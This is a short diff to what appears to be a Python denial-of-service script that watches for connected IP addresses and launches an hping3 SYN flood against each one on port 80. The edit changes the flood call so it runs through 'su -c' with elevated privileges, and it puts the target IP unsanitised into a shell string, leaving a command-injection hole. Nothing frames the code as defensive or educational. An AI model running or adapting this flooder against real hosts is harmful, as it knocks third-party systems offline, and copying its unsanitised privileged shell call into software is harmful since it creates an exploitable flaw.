@@ -9,7 +9,7 @@ def get_connected_ips():
 
 def flood_target(ip):
     print(f"Starting flood on {ip}")
-    subprocess.Popen(['hping3', '-S', '-p', '80', '--flood', ip])
+    subprocess.Popen(['su', '-c', f'hping3 -S -p 80 --flood {ip}'])
 
 def monitor_and_attack():
     known_ips = set()
